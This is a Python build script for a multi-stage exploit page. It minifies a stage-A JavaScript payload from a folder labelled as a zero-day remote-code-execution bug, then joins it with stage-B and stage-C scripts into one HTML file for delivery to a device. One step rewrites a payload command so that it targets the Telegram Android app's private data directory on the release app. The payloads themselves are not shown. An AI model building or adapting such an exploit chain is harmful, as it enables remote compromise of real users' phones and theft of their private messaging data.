#!/usr/bin/env python3
"""Build the 72801 route-2 device page (stage A + stage B + stage C).

This reproduces the 9,064 raw / ~3,814 zlib9 device page, not the standalone
1,566-byte probe. The shipped probe is a separate artifact.
"""
import argparse, os, re, subprocess, sys, tempfile, zlib

import os
HERE = os.path.dirname(os.path.abspath(__file__))
PAY = os.environ.get('STAG_PAYLOAD_DIR', os.path.join(HERE, '..', '..', '..', 'vulns', '0day-2-RCE-PARSER-SCOPE', 'STAG', 'payloads'))
SRC = open(os.path.join(PAY, 'route2', 'src', 'stage-a-device-72801.js')).read()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('out')
    ap.add_argument('--np', type=int, default=2600)
    ap.add_argument('--nq', type=int, default=2600)
    ap.add_argument('--host', action='store_true')
    a = ap.parse_args()
    src = SRC.replace('var NP = 2600, NQ = 2600', 'var NP = %d, NQ = %d' % (a.np, a.nq))
    if a.host:
        src += 'throw new Error("RESULT " + mark);\n'
    tmp = os.path.join(tempfile.gettempdir(), '_s2s3_gen.js')
    open(tmp, 'w').write(src)
    mn = subprocess.run(['terser', tmp, '-c', 'passes=2', '-m'],
                        capture_output=True, text=True)
    if mn.returncode != 0:
        sys.exit(mn.stderr)
    A = mn.stdout.strip()
    poc = os.path.join(PAY, 'route2', 'refs')
    if a.host:
        ref = open(os.path.join(poc, 'stage-b-host-reference.html')).read()
    else:
        ref = open(os.path.join(poc, 'stage-b-device-reference.html')).read()
    m = dict((n, s) for n, s in re.findall(r'<script id="([^"]+)">(.*?)</script>', ref, re.S))
    if a.host:
        B, C = m['stageB'], m['stageC']
    else:
        B = m['stageB'].replace('id>/data/data/org.telegram.messenger.beta/files/n1',
                                'id>/data/data/org.telegram.messenger/files/n1')
        C = m['stageC']
    html = ('<!doctype html><body><div id="v">Ok</div>'
            '<script id="stageA">' + A + '</script>'
            '<script id="stageB">' + B + '</script>'
            '<script id="stageC">' + C + '</script>')
    open(a.out, 'w').write(html)
    print('%s raw %d zlib9 %d' % (a.out, len(html), len(zlib.compress(html.encode(), 9))))


if __name__ == '__main__':
    main()
